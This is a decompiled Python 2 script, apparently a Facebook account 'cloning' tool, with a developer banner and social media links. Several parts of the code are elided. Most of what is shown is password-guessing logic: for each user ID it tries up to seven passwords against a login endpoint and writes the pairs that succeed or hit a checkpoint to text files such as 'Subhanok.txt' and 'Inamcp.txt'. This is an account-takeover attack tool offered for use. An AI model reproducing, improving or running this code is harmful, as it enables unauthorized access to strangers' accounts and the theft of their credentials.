...
#Decompile by HAMZA X INAM JIGERS
...
logo =      '\x1b[1;91m_____         _____ \n\x1b[1;91m/ ____|       / ____|\n\x1b[1;92m| (___        | (___\n\x1b[1;92m\___ \        \___ \\n\x1b[1;91m____) |       ____)\n\x1b[1;92m|_____/       |_____/\n\x1b[1;93m______________________________________________________\n \n \x1b[1;93m(*)\x1b[1;92m Developer : S U B H A N x P A T H A N  \x1b[1;33m\xf0\x9f\x94\xa5LOVE-K\xf0\x9f\x94\xa5\n \x1b[1;93m(*)\x1b[1;92m FB  : facebook.com/SUBHAN.94\n \x1b[1;93m(*)\x1b[1;92m Tool type : SUBHAN Cloning Tool\n \x1b[1;93m(*)\x1b[1;92m Github    : https://github.com/SUBHANxKHAN\n\x1b[1;93m______________________________________________________\n'
def tool():
    os.system('clear')
    print ''
    print logo
...
def main():
    ...
    print '\x1b[1;93m[3] \x1b[1;92mContact Owner On Instageam'
    print '\x1b[1;93m[4] \x1b[1;92mVisit My YouTube Channel'
    print '\x1b[1;93m[0] \x1b[1;92mExit'
    print 47 * '\x1b[1;93m\xe2\x96\xac'
    os.system('xdg-open https://www.facebook.com/hassanzaib.awan.9')
    main_select()
...
def log_select():
    ...
    if sel == '2':
        ...
        os.system('python2 InamXwithout.py')
    elif sel == '4':
        main()
    else:
        print ''
...
def menu():
    ...
    try:
        ...
        print logo
        print ''
        print '\x1b[1;91m\t Sorry logged in token has expired'
...
def crack_select():
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'access_token' in q:
                print '\x1b[1;92m[SUBHANOK] ' + uid + ' | ' + pass1 + ' | ' + name
                ok = open('Subhanok.txt', 'a')
                ok.write(uid + '|' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[SUBHAN] ' + uid + ' | ' + pass1 + ' | ' + name
                cp = open('Subhancp.txt', 'a')
                cp.write(uid + '|' + pass1 + '\n')
                cp.close()
                ...
                q = json.loads(data)
                if 'access_token' in q:
                    print '\x1b[1;92m[INAM OK] ' + uid + ' | ' + pass2 + ' | ' + name
                    ok = open('Syedok.txt', 'a')
                    ok.write(uid + '|' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;93m[INAM] ' + uid + ' | ' + pass2 + ' | ' + name
                    cp = open('Subhancp.txt', 'a')
                    cp.write(uid + '|' + pass2 + '\n')
                    cp.close()
                    ...
                    q = json.loads(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m[INAMOK] ' + uid + ' | ' + pass3 + ' | ' + name
                        ok = open('Subhanok.txt', 'a')
                        ok.write(uid + '|' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;93m[INAM] ' + uid + ' | ' + pass3 + ' | ' + name
                        cp = open('Subhancp.txt', 'a')
                        cp.write(uid + '|' + pass3 + '\n')
                        cp.close()
                        ...
                        q = json.loads(data)
                        if 'access_token' in q:
                            print '\x1b[1;92m[INAMOK] ' + uid + ' | ' + pass4 + ' | ' + name
                            ok = open('Inamok.txt', 'a')
                            ok.write(uid + '|' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;93m[INAMOK] ' + uid + ' | ' + pass4 + ' | ' + name
                            cp = open('Inamcp.txt', 'a')
                            cp.write(uid + '|' + pass4 + '\n')
                            cp.close()
                            ...
                            q = json.loads(data)
                            if 'access_token' in q:
                                print '\x1b[1;92m[INAMOK] ' + uid + ' | ' + pass5 + ' | ' + name
                                ok = open('Subhanok.txt', 'a')
                                ok.write(uid + '|' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;93m[INAM] ' + uid + ' | ' + pass5 + ' | ' + name
                                cp = open('Subhancp.txt', 'a')
                                cp.write(uid + '|' + pass5 + '\n')
                                cp.close()
                                ...
                                q = json.loads(data)
                                if 'access_token' in q:
                                    print '\x1b[1;92m[INAMOK] ' + uid + ' | ' + pass6 + ' | ' + name
                                    ok = open('Subhanok.txt', 'a')
                                    ok.write(uid + '|' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;93m[INAM] ' + uid + ' | ' + pass6 + ' | ' + name
                                    cp = open('Subhancp.txt', 'a')
                                    cp.write(uid + '|' + pass6 + '\n')
                                    cp.close()
                                    ...
                                    q = json.loads(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;92m[INAM] ' + uid + ' | ' + pass7 + ' | ' + name
                                        ok = open('Inamok.txt', 'a')
                                        ok.write(uid + '|' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print '\x1b[1;93m[INAM] ' + uid + ' | ' + pass7 + ' | ' + name
                                        cp = open('Inamcp.txt', 'a')
                                        cp.write(uid + '|' + pass7 + '\n')
                                        cp.close() 
    ...
    print ' \x1b[1;92mNote: Clone Account Saved Sdcard Folder: Subhancp.txt'
    print 54 * '_'
    print ''
    print ''
...
def choice_select():
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'access_token' in q:
                print '\x1b[1;92m[INAMOK] ' + uid + ' | ' + pass1 + ' | ' + name
                ok = open('Inamok.txt', 'a')
                ok.write(uid + '|' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[INAM] ' + uid + ' | ' + pass1 + ' | ' + name
                cp = open('Inamcp.txt', 'a')
                cp.write(uid + '|' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
                ...
                q = json.loads(data)
                if 'access_token' in q:
                    print '\x1b[1;92m[INAMOK] ' + uid + ' | ' + pass2 + ' | ' + name
                    ok = open('Inamok.txt', 'a')
                    ok.write(uid + '|' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                    ...
                    q = json.loads(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m[INAM] ' + uid + ' | ' + pass3 + ' | ' + name
                        ok = open('Inamok.txt', 'a')
                        ok.write(uid + '|' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                        ...
                        if 'access_token' in q:
                            ...
                            print '\x1b[1;93m[INAM] ' + uid + ' | ' + pass4 + ' | ' + name
                            cp = open('Inamcp.txt', 'a')
                            cp.write(uid + '|' + pass4 + '\n')
                            cp.close()
                            cps.append(uid + pass4)
                            ...
                            if 'access_token' in q:
                                ...
                                if 'access_token' in q:
                                    ...
                                    q = json.loads(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;92m[INAMOK] ' + uid + ' | ' + pass7 + ' | ' + name
                                        ok = open('Inamok.txt', 'a')
                                        ok.write(uid + '|' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
